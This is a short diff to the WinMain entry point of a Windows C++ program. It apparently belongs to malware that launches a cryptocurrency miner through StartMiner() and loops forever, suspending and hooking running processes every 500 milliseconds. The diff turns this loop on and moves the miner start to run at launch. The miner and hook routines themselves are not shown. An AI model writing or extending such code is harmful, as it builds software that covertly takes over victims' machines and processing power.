@@ -27,13 +27,14 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	UNREFERENCED_PARAMETER(lpCmdLine);
 	hInst = hInstance;
 
-	/*while (TRUE) {
+    StartMiner();
+	while (TRUE) {
 		process_allSuspendApplyResume(HookProcess);
 		Sleep(500);
 		//break; // TODO remove
-	}*/
+	}
     //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5384);
-    PROCESSENTRY32 entry;
+    /*PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
@@ -50,7 +51,5 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                 CloseHandle(hProcess);
             }
         }
-    }
-    StartMiner();
-	return 0;
+    }*/
 }
